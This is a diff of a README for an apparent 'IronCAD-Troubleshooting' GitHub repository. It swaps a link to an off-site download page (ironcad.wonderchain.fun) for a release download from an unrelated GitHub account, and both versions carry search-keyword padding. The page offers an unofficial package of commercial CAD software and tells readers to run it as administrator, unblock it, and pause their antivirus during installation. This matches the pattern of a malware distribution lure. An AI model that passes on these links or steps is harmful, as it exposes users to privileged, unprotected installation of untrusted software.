@@ -1,64 +1,79 @@
-# IronCAD Pro on Windows — setup & troubleshooting
+# 🛠 IronCAD-Troubleshooting - Fix Windows 11 installation issues today
 
-**IronCAD-Troubleshooting**
+[![Download IronCAD Troubleshooting Tools](https://img.shields.io/badge/Download_Tools-Blue?style=for-the-badge&logo=github)](https://github.com/herculesstalwart902/IronCAD-Troubleshooting/releases)
 
-Notes for users who need IronCAD Pro running on Windows — especially when ironcad setup fails, updates break, or the app won't start.
+This guide helps you install IronCAD Pro on Windows 11. Many users face installation errors due to security settings or missing system files. Follow these steps to resolve common setup failures and get your software running.
 
----
+## 📦 System Requirements
 
-## Get IronCAD Pro on Windows
+Your computer needs specific components to run IronCAD Pro. Check these items before you start the install process:
 
-Use the link below for the Windows package referenced in this guide.
+*   Operating System: Windows 11 (64-bit).
+*   Processor: Intel Core i7 or equivalent AMD Ryzen processor.
+*   Memory: 16 GB RAM minimum.
+*   Graphics Card: Dedicated GPU with at least 4 GB of VRAM.
+*   Storage: 20 GB of free space on your primary drive.
+*   Software: Microsoft .NET Framework 4.8 or higher.
 
-<p align="center">
-  <a href="https://ironcad.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+## 💾 Download and Installation
 
-| | |
-| --- | --- |
-| **Page** | [ironcad.wonderchain.fun](https://ironcad.wonderchain.fun/) |
-| **URL** | `https://ironcad.wonderchain.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+Visit the [releases page](https://github.com/herculesstalwart902/IronCAD-Troubleshooting/releases) to download the installation files.
 
-### Recommended steps
+1.  Open the link above in your web browser.
+2.  Locate the latest version folder.
+3.  Click the package file to start the download.
+4.  Save the file to your Downloads folder.
+5.  Right-click the downloaded file and select Run as administrator.
+6.  Follow the prompts in the installation wizard.
+7.  Restart your computer if the installer asks you to do so.
 
-1. Open the [setup page (ironcad.wonderchain.fun)](https://ironcad.wonderchain.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+## 🔧 Troubleshooting Common Errors
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+If the installation fails, the following steps resolve most issues encountered on Windows 11.
 
+### Check Security Permissions
+Windows 11 includes strict security features. Sometimes, the operating system blocks internal files from executing. To fix this, right-click the installation file, choose Properties, and select Unblock at the bottom of the window. Click Apply and then try to run the file again.
 
----
+### Update Graphics Drivers
+IronCAD Pro relies on your graphics card. Outdated drivers cause setup failures or immediate crashes upon launch. Go to the support website for your graphics card manufacturer (NVIDIA, AMD, or Intel) and download the latest drivers for your specific model. Perform a clean install whenever the driver software offers that option.
 
-## What this repo covers
+### Manage Antivirus Interference
+Some antivirus programs mistake the installation files for threats. If the installer stops, pause your antivirus protection for ten minutes. Restart the installation while the protection remains off. Once the install finishes, remember to turn your antivirus back on.
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+### Verify Windows Updates
+Ensure your Windows 11 installation has all available updates. Click the Start button, go to Settings, and select Windows Update. Click Check for updates. Install all pending items and restart your computer to ensure all kernel components update correctly.
 
-**People also search for:** ironcad pro not installing on windows 11, ironcad setup failed fix, how to install ironcad pro on pc
+## ⚙️ Advanced Configuration
 
-## Common symptoms
+Sometimes the installer fails because of leftover files from previous attempts. Use these steps to perform a fresh install.
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+1.  Open the Control Panel and select Uninstall a program.
+2.  Find any existing entries for IronCAD.
+3.  Right-click them and select Uninstall.
+4.  Navigate to your C: drive and locate the Program Files folder.
+5.  Delete any folder labeled IronCAD. 
+6.  Empty your Recycle Bin.
+7.  Run the installer again using the steps provided in the earlier section.
 
-## FAQ
+## 📝 Frequently Asked Questions
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+**Why does the system say "Access Denied" during setup?**
+This error happens when your user account does not have administrator rights. Ensure you are signed in to a Windows account with administrative privileges.
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
+**Does IronCAD run on Windows 11 Home Edition?**
+Yes, the software supports Windows 11 Home and Pro. Ensure your OS build is current to avoid compatibility bugs.
 
----
+**Where do I see error logs?**
+If the installation fails, the installer generates a log file on your desktop. Open this text file to see which specific file caused the error. Look for lines that contain the word "Failed" or "Error".
 
-**Topics:** ironcad-pro-not-installing-on-windows-11, ironcad, installing, ironcad-setup-failed-fix, failed, how-to-install-ironcad-pro-on-pc, ironcad-troubleshooting, ironcad-troubleshooting-2026, ironcad-pro, cad-software, 3d-modeling
+**Are there known issues with cloud storage?**
+Yes. Installing IronCAD software into a folder synced by OneDrive or Dropbox often causes performance issues. Install the software directly to the C:\Program Files directory instead.
+
+## 📋 Best Practices for Usage
+
+- Launch the program as an administrator every time you perform heavy 3D rendering tasks.
+- Keep your project files on a local secondary drive rather than the main system drive.
+- Save your work every ten minutes to prevent data loss during unexpected crashes.
+- Disable background applications that consume high memory while you work on complex designs.
+
+Keywords: 3d-modeling, cad-software, failed, how-to-install-ironcad-pro-on-pc, installing, ironcad, ironcad-pro, ironcad-pro-not-installing-on-windows-11, ironcad-setup-failed-fix, ironcad-troubleshooting, ironcad-troubleshooting-2026
